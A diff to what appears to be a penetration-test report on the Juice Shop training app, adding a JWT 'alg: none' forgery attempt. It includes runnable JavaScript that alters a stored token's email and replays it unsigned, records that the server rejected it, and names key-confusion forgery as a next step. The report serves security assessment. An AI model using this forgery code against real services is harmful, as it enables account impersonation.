@@ -157,11 +157,27 @@ Combined with the XSS finding (JS-05), which can exfiltrate the token from stora
 hands an attacker the account's privilege level and credential hash directly. Putting a
 password hash in a client-readable token is a cryptographic storage/exposure failure.
 
-> **Note on scope.** This finding documents the *payload disclosure* that was directly
-> reproduced. A stronger follow-up test — forging the payload (altering `role`) and
-> re-signing to achieve privilege escalation — was not performed in this assessment and
-> would require signing-key analysis with a tool such as `jwt_tool`; it is noted as
-> recommended further testing rather than a confirmed finding.
+### Forgery attempt (negative result)
+A follow-up test attempted to escalate this to identity spoofing using the classic
+`alg: none` (unsigned token) forgery:
+
+```js
+const b64url = o => btoa(JSON.stringify(o)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+const p = JSON.parse(atob(localStorage.getItem('token').split('.')[1]));
+p.data.email = 'jwtn3d@juice-sh.op';                 // forged identity
+const forged = b64url({alg:'none', typ:'JWT'}) + '.' + b64url(p) + '.';
+fetch('/rest/user/whoami', {credentials:'omit', headers:{'Authorization':'Bearer '+forged}})
+  .then(r=>r.json()).then(d=>console.log(JSON.stringify(d)));
+```
+
+With the session cookie suppressed (`credentials:'omit'`) so the forged header was the
+only credential, the server returned `{"user":{}}` — it **rejected** the unsigned token
+and granted no identity. The `alg: none` bypass therefore does not succeed against this
+build; signature validation is enforced for this path.
+
+This bounds the finding at **payload disclosure (Medium)**. Escalation to a successful
+forge (e.g. RS256→HS256 key-confusion using the bundled public key, tested with
+`jwt_tool`) is recommended further testing, not a confirmed result here.
 
 ### Remediation
 - Never place secrets in a JWT payload. Remove the password hash and any sensitive
